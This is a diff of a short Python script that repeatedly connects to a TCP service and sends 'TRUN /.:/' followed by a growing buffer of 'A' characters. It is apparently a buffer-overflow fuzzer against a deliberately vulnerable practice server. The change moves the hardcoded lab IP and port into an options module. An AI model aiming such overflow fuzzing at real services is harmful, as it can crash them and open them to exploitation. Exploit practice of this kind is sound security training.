@@ -2,13 +2,14 @@
 
 import sys, socket
 from time import sleep
+from options import HOST, PORT
 
 buffer = 'A' * 100
 
 while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('192.168.33.16', 9999))
+        s.connect((HOST, PORT))
 
         cmd = ('TRUN /.:/' + buffer)
         # print("SEND "+cmd)
